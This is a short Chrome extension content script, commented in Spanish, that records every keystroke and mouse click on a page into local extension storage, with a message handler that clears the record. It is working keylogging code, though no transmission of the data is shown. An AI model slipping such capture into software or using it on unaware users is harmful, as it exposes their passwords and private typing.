'use strict';

//almacena las pulsaciones de teclas y clicks
var cadena = []
var IdTab = "" 

//recibimos la orden de vaciado de cadena--------------------------------------------------------
chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
	if (message.Identifier == 'borrar'){
		cadena = []; //vaciamos la cadena
    	console.log('Memoria vaciada');
	}
});

//Captura las teclas pulsadas y las introduce en el array----------------------------------------
window.addEventListener('keydown', function (event) {
    var key = event.key;
    cadena.push(key);
    chrome.storage.local.set({'keys' : JSON.stringify(cadena)}, function() {
          // Notifica el almacenamiento
          console.log('Key saved');
    });
});

//Captura los click de raton y los introduce en el array------------------------------------------
window.addEventListener('click', function(){
  cadena.push("CLICK");
  chrome.storage.local.set({'keys' : JSON.stringify(cadena)}, function() {
        // Notifica el almacenamiento
        console.log('Click saved');
   });
});